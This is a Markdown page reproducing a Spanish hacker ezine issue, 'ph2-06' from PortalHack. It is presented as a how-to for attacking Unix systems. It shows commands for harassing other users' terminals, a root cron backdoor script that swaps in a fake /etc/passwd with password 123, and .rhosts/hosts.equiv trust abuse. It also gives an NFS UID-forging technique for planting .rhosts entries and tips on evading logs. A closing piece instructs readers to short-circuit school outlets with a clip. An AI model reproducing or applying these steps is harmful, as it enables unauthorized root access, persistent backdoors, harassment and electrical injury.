@@ -1,0 +1,316 @@
+---
+title: "ph2-06"
+ezine: "portal_hack"
+---
+
+# ph2-06
+
+**Ezine:** portal_hack
+
+<div className="ascii-content">
+
+```
+[::......................o( oTHERS )o.......................::]
+
+1. Sistemas Unix y derivados
+
+Chinchando a la gente en un sistema UNIX
+
+Si estßs como en un sistema UNIX y hay alguien mßs conectado, puedes divertirte chinchßndolo. 
+Por ejemplo, puedes enviarle mensajes a su consola. Sin necesidad de ser root. 
+
+Primero haces un who: 
+
+$ who 
+
+badboy tty1 
+
+juan tty2 
+
+TTY1 es la c≤nsola que t· usas, y TTY2 la que usa Juan. 
+Los controladores de estas c≤nsolas estßn en el directorio /dev/. 
+Una c≤nsola de tipo TTY es generalmente de un usuario de m≤dem. 
+
+Para enviarle un mensaje a Juan, puedes hacer: 
+
+$ banner idiota >/dev/tty2 
+
+A juan le aparecerß ese mensaje en su pantalla. 
+
+De hecho puedes enviar cualquier cosa a la pantalla de Juan. 
+Incluso un archivo de un mont≤n de lineas, si Θl tiene una conexi≤n 
+mala preferirß desconectar. 
+
+$ cat biblia.volumen1 >>/dev/tty2& 
+
+A ti el archivo no te aparece, pero a Θl sφ. 
+
+Incluso puedes hacer que todo lo que t· hagas le salga a Θl, transmitiΘndole tu shell: 
+
+$ sh >/dev/tty2 
+$ echo Juan, eres tontisimo 
+$ banner idiota 
+
+Hagas lo que hagas le saldrß en su pantalla. 
+
+Naturalmente haciendo todas estas memeces te cerrarßn el acceso en cuesti≤n 
+de horas, pero si eres root puedes hacer lo que te plazca y luego modificar 
+los logs para que el admin no vea tus travesuras. Claro que Juan, si te ve como 
+root haciendo eso le dirß en seguida al admin real que alguien ha entrado con 
+acceso root y turur·. 
+
+Otra cosa que puedes hacer si eres root es modificar el .profile de 
+un usuario de manera que cuando conecte, desconecte sistemßticamente. 
+
+Esto se consigue a±adiendo una lφnea "kill -1 0" al .profile de un usuario. 
+
+Lo que hagas depende de tu imaginaci≤n. Y ya sabes que la imaginaci≤n no tiene 
+lφmites. Puedes chinchar a la gente de un mont≤n de maneras. Y cuando me refiero 
+a chinchar no me refiero a borrar cosas ni nada por el estilo. No es necesario 
+recurrir a eso para pasarlo bien. 
+
+La utilidad "Cron"
+
+ QuΘ es Cron ? Cron es el reloj de UNIX. Es, por supuesto, un daemon. 
+Entre otras cosas permite programar tareas para que se ejecuten diariamente 
+a una hora determinada, o solo una vez al a±o cierto dφa, etc... Es una utilidad 
+muy bonita, sφ se±or. Muy bonita para hacer backdoors. El directorio en el que 
+trabajaremos casi siempre es: 
+
+/var/spool/cron/crontabs/ 
+
+Y el fichero que nos interesa se llama "root", ya que dentro de las crontabs 
+pueden haber varios ficheros, cada uno para un usuario distinto. "Root", entonces, 
+son las tareas que el root programa. O dicho de otra manera, el fichero que permite 
+ejecutar CUALQUIER tipo de tarea. 
+
+Cada fichero crontab tiene este aspecto: 
+
+1 2 3 4 5 6 
+
+0 0 * * 1 /usr/bin/updatedb 
+
+Hay seis campos: 
+1 - El primer campo indica el minuto (0 - 59) 
+2 - El segundo campo indica la hora (0 - 23) 
+3 - El tercer campo indica el dφa del mes (1 - 31) 
+4 - El cuarto campo indica el mes del a±o (1 - 12) 
+5 - El quinto campo indica el dφa de la semana (1 - 7) 
+6 - El sexto campo es el programa que se ejecuta 
+
+Un asterisco significa que se ejecuta en cualquiera de los rangos posibles. 
+En el ejemplo, la utilidad updatedb se ejecuta a las 24:00 todos los lunes 
+del a±o. ( ┐ QuΘ tal si ponemos que todas las tareas que ya hayan programadas 
+se ejecuten el 30 de Febrero de cada a±o ? ┐ Se enfadarß el admin ? ). 
+
+Sabiendo esto podemos introducir todo tipo de actividades programadas en 
+nuestro favor. He aquφ un ejemplo muy rebuscado: 
+
+- Hacemos que cada dφa, a las 2:30 de la ma±ana el archivo passwd cambie 
+y se convierta en un archivo passwd con una sola entrada, la de root, y 
+con un password que ya conocemos, todo a travΘs de un shellscript, el cual 
+se encarga, al cabo de un minuto, de volver a poner el passwd original de 
+manera que en ese minuto tenemos tiempo de entrar como root (í pero solo 
+tenemos un minuto !). Por supuesto hay que sincronizar los relojes. Este es el proceso: 
+
+A±adimos este campo al crontab de root: 
+
+30 2 * * * /bin/usr/badboy/.prueba 
+
+El fichero .prueba es el shellscript que hace todo el tinglao, y 
+estß en mi directorio de inicio. Por supuesto tiene ese nombre para 
+no levantar sospechas si el root echa un vistazo a mi directorio de inicio. 
+
+Ahora copiamos el archivo passwd y lo modificamos para que solo haya una 
+entrada, la de root, y esta tenga un password normal, por ejemplo: 
+
+root:123:0:0:operador:/:/bin/sh 
+
+El password es 123. 
+
+Este archivo tambiΘn lo ocultamos, por ejemplo, en mi directorio de 
+inicio (o en cualquier lugar del sistema), y lo llamamos .copia. 
+
+Y finalmente hacemos el shellscript .prueba: 
+
+cp /etc/passwd /etc/.temp 
+cp /usr/badboy/.copia /etc/passwd 
+sleep 60 
+mv /etc/.temp /etc/passwd 
+
+Resumiendo: 
+
+- Tenemos un archivo de passwd falso con una sola entrada, la de root, 
+con el password 123 ocultado por ahφ 
+
+- Tenemos un shellscript que se encarga de copiar ese archivo de passwd 
+falso y a continuaci≤n al cabo de un minuto restablecer el archivo de password original 
+
+- La lφnea que hemos a±adido al crontab de root se encarga de ejecutar 
+este shellscript cada dφa del a±o a las 2:30. 
+
+Conclusi≤n: Cada dφa podemos acceder al sistema como root durante un minuto a 
+las 2:30, con el password 123. 
+
+Con la utilidad crontab podemos hacer miles de backdoors y de caballos de troya. 
+Es realmente muy ·til. 
+
+Los maravillosos comandos "R"
+
+Los comandos "R" son comandos exclusivos del sistema UNIX. La "R" proviene de 
+la palabra Remote. Por lo tanto, los comandos "R" sirven para ejercer tareas de 
+red. Vamos a analizar tres de ellos y a poner ejemplos de lo ·tiles que pueden ser. 
+
+Rlogin 
+
+Ya conoceis Rlogin. Como su nombre indica, sirve para hacer login a un sistema remoto. 
+Lo bueno de Rlogin y de los comandos "r" es que usados de cierta manera nos permiten 
+entrar directamente en el sistema sin necesidad de autentificaci≤n. 
+
+Ejemplo 1: 
+En UNIX cada usuario tiene en su directorio de inicio el archivo .rhosts. 
+Este archivo contiene las IP's o Host's vßlidas para entrar con la cuenta de este 
+usuario. ┐ QuΘ quiere decir esto ? Quiere decir que, si en el fichero .rhosts de 
+Julia hay un host "julia.com", cualquier usuario que estΘ conectado a internet 
+con el host "julia.com" podrß entrar directamente con la cuenta Julia sin necesidad 
+de poner password alguno con un rlogin. Entonces, si pudiesemos modificar el .rhosts 
+de Julia y escribir nuestra IP en Θl, podrφamos entrar directamente como Julia sin 
+necesidad de password con un rlogin. 
+
+Ejemplo 2: 
+El fichero host.equiv contiene las direcciones de los ordenadores que pueden 
+entrar directamente al sistema sin autentificaci≤n, los ordenadores trusteds o 
+colegas. La configuraci≤n de este fichero por defecto permite hacer un rlogin como 
+cualquier usuario (mientras no sea root) del sistema. Asφ, si queremos entrar como 
+BIN basta con que nosotros en nuestro ordenador seamos BIN. 
+
+Ejemplo 3: 
+Supongamos que el directorio de inicio de Julia estß siendo exportado vφa 
+NFS y es accesible a todo el mundo. Esta suposici≤n, para quΘ enga±arnos, 
+es muy improbable. El admin tendrφa que estar muy loco para dejar a cualquier 
+hacker coger cosas del directorio de un usuario de su sistema. Pero es solo una suposici≤n. 
+
+export list for ftp.lammahs.org: 
+/usr/julia (everyone) 
+/export/swap (easy) 
+/ftp/ (easy) 
+
+Como os he dicho, es una suposici≤n para que sepais c≤mo aprovechar fallos 
+en el NFS. Lo primero que hacemos es montar el directorio de julia a nuestro ordenador: 
+
+# pwd 
+/ 
+# mkdir /julia 
+# mount ftp.lammahs.org:/usr/julia /julia 
+
+Ahora tenemos acceso a los archivos de julia sin estar conectados al sistema 
+desde nuestro ordenador yendo al directorio julia: 
+
+# cd julia 
+# ls -la 
+
+Al hacer un listado detallado veremos todos los ficheros de Julia. En la 
+casilla donde sale el owner del fichero, nos aparecerß un n·mero. Este 
+n·mero es la etiqueta que el root ha puesto a Julia para identificarla. 
+Es el n·mero que aparece en el fichero passwd en la cuenta de Julia. 
+
+Podemos ver los archivos pero no podemos modificarlos. Para modificarlos tenemos 
+que estar al mismo nivel, es decir, ser Julia. Para conseguir eso a±adimos a nuestro 
+passwd una cuenta que tiene que cumplir estos requisitos: 
+
+- el nombre tiene que ser el de julia 
+- el n·mero identificativo tiene que ser el que hemos visto al listar los ficheros 
+- no tenemos que especificar password, pondremos uno shadow 
+- tampoco especificaremos shell 
+
+Suponiendo que el n·mero identificativo que hemos encontrado es el 1000, tiene que 
+quedar algo asφ: 
+
+julia:x:1000:1::/: 
+
+Como hemos a±adido una nueva cuenta a nuestro passwd, ya podemos usarla. Dejamos 
+de ser root para convertirnos en Julia. 
+
+Nota: Cambiar de acceso en sistemas UNIX se puede efectuar a travΘs del programa 
+SU. Si somos root y queremos tener acceso de usuario normal, pues escribiremos SU 
+&lt;usuario>. Si somos usuario normal y queremos hacernos root, escribiremos SU root 
+o simplemente SU a secas y nos pedirß el password de root. 
+
+# su julia 
+
+Ahora que ya somos julia, podemos modificar los ficheros que hemos montado. 
+┐ QuΘ se os ocurre que podemos hacer ? Por supuesto, a±adir a .rhosts nuestra I
+P actual para poder hacer un login directamente sin password a ftp.lammahs.org como Julia. 
+
+┐ Lo pillais ? 
+
+Rusers 
+
+Este comando nos permite coger una informaci≤n detallada del sistema que 
+queremos atacar. Muestra todos los usuarios que estßn activos, de alguna 
+manera, en la red del sistema. 
+
+# rusers -l ftp.lammahs.org 
+
+1 2 3 4 
+
+root / /bin/sh Tue Nov 7 05:00 on ttyp1 from lammahs.org 
+bin /bin Never logged in 
+daemon / Fri Jul 12 00:01 on ttyp0 from lammahs.org 
+sync / /bin/sync Fri Jul 12 00:01 on ttyp0 from lammahs.org 
+guest /export/foo /bin/sh Never logged in 
+ftp /home/ftp Never logged in 
+
+Aparecen cuatro campos: 
+
+1 - El nombre de login del usuario del sistema 
+2 - El directorio de inicio del usuario 
+3 - El shell del usuario 
+4 - La ·ltima vez que hizo login o si estß actualmente conectado al sistema. 
+
+Rsh 
+
+Remote Shell es parecido a Rlogin. Sin embargo, incorpora una opci≤n que permite 
+esquivar los logs WMTP y UTMP, si podemos hacer un login directo. Ejemplo: 
+
+# rsh ftp.lammahs.org csh -i 
+
+Como ya he dicho antes, esto solo se usa si se puede hacer un login directo 
+como he explicado en la secci≤n Rlogin. 
+
+
+BadBoy
+
+----------------')
+
+2. Corta la luz en tu escuela
+
+Bueno... Siii, lo que siempre quisiste hacer.. salir antes de hora...
+
+Explicaci≤n: Bueno... todos los establecimientos publicos (o prviados) tienen
+por LEY tener una Termica o Disyuntor o "Tapones" o lo que sea (son sistemas
+que cuando detectan un cortocircuito en el trazado de la luz electrica
+automaticamente detiene el abastecimiento de corriente, evitando asi que te quedes 
+pegado >;) ) 
+
+Materiales: Baratisisisissimos, un encufe normal (sin cable) y un clip
+
+Armado: Abris el enchufe y "puenteas" con el clip del polo [+] al [-] lo cual 
+provocaria el cortocircuito ;))
+
+Prodecimiento: Vas a cualquier enchufe y tocas apenas como encufando y salta la luz!!
+
+Precauciones: No me hago responsable si no adquiriste la informacion suficiente y 
+el establecimiento no poseia disyuntor, termica, etc...
+Aislate bien (con cinta aisladora) por las dudas...
+
+Trucos: Si quieren salir antes pueden dejar el enchufe enchufado, lo cual...
+cuando la luz se reanude, este siga en corto y salte de nuevo, (bucle!!)
+
+PortalHack Team
+http://portalhack.cjb.net
+
+---------------------------------------------------------[ph2-06.txt]--
+```
+
+</div>
